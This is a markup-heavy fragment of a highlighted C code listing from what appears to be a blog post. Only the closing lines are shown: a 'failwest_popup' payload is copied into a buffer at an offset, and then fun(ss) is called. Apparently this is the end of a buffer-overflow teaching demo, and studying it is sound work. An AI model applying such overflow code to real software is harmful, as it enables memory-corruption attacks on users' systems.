rgb(0, 0, 0);">&nbsp;&nbsp;&nbsp;&nbsp;strcpy(ss</span><span style="color: rgb(0, 0, 0);">+</span><span style="color: rgb(128, 0, 128);">20</span><span style="color: rgb(0, 0, 0);">,&nbsp;failwest_popup);<br></span><span style="color: rgb(0, 128, 128);">72</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">73</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;fun(ss);<br></span><span style="color: rgb(0, 128, 128);">74</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">75</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: rgb(0, 0, 255);">return</span><span style="color: rgb(0, 0, 0);">&nbsp;</span><span style="color: rgb(128, 0, 128);">0</span><span style="color: rgb(0, 0, 0);">;<br></span><span style="color: rgb(0, 128, 128);">76</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/InBlock.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">77</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/ExpandedBlockEnd.gif" align="top">}</span></span><span style="color: rgb(0, 0, 0);">&nbsp;<br></span><span style="color: rgb(0, 128, 128);">78</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"><br></span><span style="color: rgb(0, 128, 128);">79</span><span style="color: rgb(0, 0, 0);"><img src="https://www.cnblogs.com/images/OutliningIndicators/None.gif" align="top"></span></div><br>